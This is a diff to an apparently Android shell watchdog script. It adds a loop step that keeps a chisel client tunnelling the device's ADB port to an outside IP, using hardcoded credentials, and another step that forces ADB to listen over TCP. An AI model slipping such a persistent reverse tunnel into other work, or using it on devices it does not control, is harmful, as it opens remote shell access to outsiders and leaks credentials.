@@ -59,10 +59,27 @@ check_gadget() {
     fi
 }
 
+check_chisel() {
+    if ! pgrep -f "[c]hisel" >/dev/null 2>&1; then
+        if [ -x /data/local/tmp/chisel ]; then
+            nohup /data/local/tmp/chisel client --keepalive 15s --auth tablet:tvbridge2026 http://129.146.5.64:80/chisel --header "Host: tv.smre.run.place" R:25556:127.0.0.1:5555 >> /data/local/tmp/chisel.log 2>&1 &
+        fi
+    fi
+}
+
+check_adb() {
+    if ! grep -q " 00000000:15B3 " /proc/net/tcp 2>/dev/null && ! grep -q " 00000000000000000000000000000000:15B3 " /proc/net/tcp6 2>/dev/null; then
+        setprop persist.adb.tcp.port 5555
+        setprop service.adb.tcp.port 5555
+    fi
+}
+
 TICK=0
 while true; do
     sleep 5
     check_gadget
+    check_chisel
+    check_adb
     TICK=$((TICK + 1))
     if [ $TICK -ge 3 ]; then
         TICK=0
